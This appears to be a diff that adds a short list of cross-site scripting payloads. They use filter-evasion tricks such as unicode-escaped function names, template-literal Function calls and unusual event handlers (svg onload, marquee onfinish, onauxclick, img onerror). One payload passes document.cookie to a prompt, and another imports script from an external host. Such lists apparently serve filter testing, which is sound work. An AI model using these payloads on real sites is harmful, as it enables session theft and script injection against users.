@@ -1,0 +1,10 @@
+<svg onload='new Function`["_Y000!_"].find(al\u0065rt)`'>
+
+<marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>
+
+<x onauxclick=import('//xss/')>click
+
+<img src=x onerror=(a=alert,b=1,a(b))>
+
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
